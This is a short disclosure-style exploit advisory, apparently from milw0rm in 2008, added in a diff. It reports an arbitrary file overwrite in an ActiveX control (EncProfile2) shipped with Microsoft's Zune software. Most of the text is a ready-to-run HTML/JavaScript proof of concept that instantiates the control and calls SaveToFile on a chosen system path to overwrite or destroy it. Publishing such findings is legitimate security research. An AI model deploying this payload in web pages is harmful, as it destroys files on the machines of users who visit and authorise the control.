@@ -1,0 +1,26 @@
+Vulnerability class : Arbitrary file overwrite
+Discovery date : 21 April 2008
+Remote : Yes
+Credits : J. Bachmann & B. Mariani from ilion Research Labs
+Vulnerable : Zune software: EncProfile2 Class
+
+An arbitrary file overwrite as been discovered in an ActiveX control installed with the Zune software package.
+If a user visits the malicious page and authorize the control to run (it is not marked safe for scripting), the attacker can erase an arbitrary file.
+
+POC:
+<HTML>
+<BODY>
+ <object id=ctrl classid="clsid:{0B1C3B47-207F-4CEA-8F31-34E4DB2F6EFD}"></object>
+<SCRIPT>
+function Do_it()
+ {
+   File = "c:\\boot_.ini"
+   ctrl.SaveToFile(File)
+ }
+</SCRIPT>
+<input language=JavaScript onclick=Do_it() type=button value="Proof of
+Concept">
+</BODY>
+</HTML>
+
+# milw0rm.com [2008-04-23]
